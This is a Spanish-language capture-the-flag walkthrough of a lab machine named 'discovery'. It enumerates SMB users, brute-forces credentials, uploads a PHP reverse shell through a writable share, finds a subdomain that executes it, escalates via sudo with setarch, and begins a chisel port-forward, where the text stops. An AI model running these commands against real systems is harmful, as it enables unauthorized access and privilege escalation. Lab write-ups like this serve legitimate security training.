Hacemos el escaneo con nmap:
![[Pasted image 20231229113216.png]]
Hay una herramienta llamada rpcclient que nos permite enumerar usuarios existentes dentro de la máquina víctima si vemos que tiene abierto el puerto 445:
```bash
rpcclient -U "" -N 192.168.0.54
querydispinfo and enumdomusers
```
![[Pasted image 20231229113412.png]]
También añadimos el posible dominio de discovery.nyx:
![[Pasted image 20231229120624.png]]
Y vemos que funciona:
![[Pasted image 20231229120309.png]]
Ahora que tenemos dos usuarios, probamos en hacer un ataque de fuerza bruta con estos usuarios dentro de SMB en busca de alguna contraseña con hydra o metasploit:
![[Pasted image 20231229114418.png]]
Una vez tenemos las credenciales, podemos acceder a los recursos compartidos con smbmap de forma autenticada:
```bash
smbmap -u "ken" -p "kenken" -H 192.168.0.54
```
![[Pasted image 20231229114808.png]]
Si accedemos el recurso de ken, donde tenemos permisos de escritura y lectura, nos encontramos con un index.html:
```bash
smbmap -u "ken" -p "kenken" -H 192.168.0.54 -r ken
```
![[Pasted image 20231229114903.png]]
Y suponemos que este index.html está conectado con el navegador:
![[Pasted image 20231229114940.png]]
En este punto, podemos probar en subir una webshell pero no conecta, y si hacemos fuzzing por este puerto 80 tampoco encontramos nada, por lo que pasamos a enumerar el puerto 81, que es igual al 80:
![[Pasted image 20231229115246.png]]
Y vemos el directorio under_construction:
![[Pasted image 20231229115313.png]]
Pero no tenemos acceso:
![[Pasted image 20231229120341.png]]
Una vez en este punto, probamos en realizar distintas peticiones HTTP y con curl mediante el método POST podemos encontrar un dominio nuevo:
```bash
curl -X POST "http://discover.nyx:81/under_construction/"
```
![[Pasted image 20231229120832.png]]
Lo añadimos al /etc/hosts:
![[Pasted image 20231229121620.png]]
Y ahora con smbclient subimos una weverse shell en php para intentar probar si el subdominio de todiscover.nyx interpreta la webshell:
```bash
smbclient //192.168.0.54/ken -U ken%kenken -c "put pwned.php"
```
Y con smbmap comprobamos que se ha subido:
![[Pasted image 20231229121337.png]]
Pero vemos que no:
```bash
http://todiscover.nyx/pwned.php
```
![[Pasted image 20231229121649.png]]
Pero podemos probar en hacer una búqeda de subdominios dentro del todiscover y apuntando contra el archivo que hemos subido anteriormente:
```bash
wfuzz -c --hc=404 --hl=7 -X POST -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.todiscover.nyx" -u "http://todiscover.nyx/pwned.php"
```
![[Pasted image 20231229122345.png]]
Y al tener este nuevo subdominio de smbc, podemos probar si este dominio interpreta nuestro archivo malicioso en php:
![[Pasted image 20231229122539.png]]
```bash
http://smbc.todiscover.nyx/pwned.php
```
Accedemos desde el navegador:
![[Pasted image 20231229122601.png]]
Y recibimos la reverse shell:
![[Pasted image 20231229122614.png]]
Y al ejecutar sudo -l nos encontramos con este binario:
![[Pasted image 20231229122914.png]]
Investigamos el binario de setarch en gtfobins y vemos como utilizarlo para pivotar al usuario takeshi en este caso:
![[Pasted image 20231229122953.png]]
```bash
sudo -u takeshi /usr/bin/setarch $(arch) /bin/sh
```
Y somos el usuario takeshi:
![[Pasted image 20231229123042.png]]
Y ahora si ejecutamos otra vez sudo -l nos encontramos con que podemos ejecutar pydoc3 como sudo:
![[Pasted image 20231229123123.png]]
Al ejecutarlo vemos estas instrucciones:
![[Pasted image 20231229123148.png]]
Si levantamos un servidor HTTP con este binario, vemos que se levanta pero en local:
![[Pasted image 20231229123614.png]]
Por tanto tenemos que traernos este puerto a la máquina atacante con chisel, por lo que lo descargamos:
![[Pasted image 20231229123809.png]]
Y lo compartimos con la máquina víctima:
![[Pasted image 20231229123821.png]]
![[Pasted image 20231229123830.png]]
Una vez hecho esto, ejecutamos chisel en la máquina atacante para estar a la escucha:
```bash
chisel server --reverse -p 8888
```
![[Pasted image 20231229124010.png]]
Y ahora en la máquina víctima, ejecutamos primero el comando para levantar el servicio y después aplicamos un operador lógico && para hacer el port forwarding con chisel:
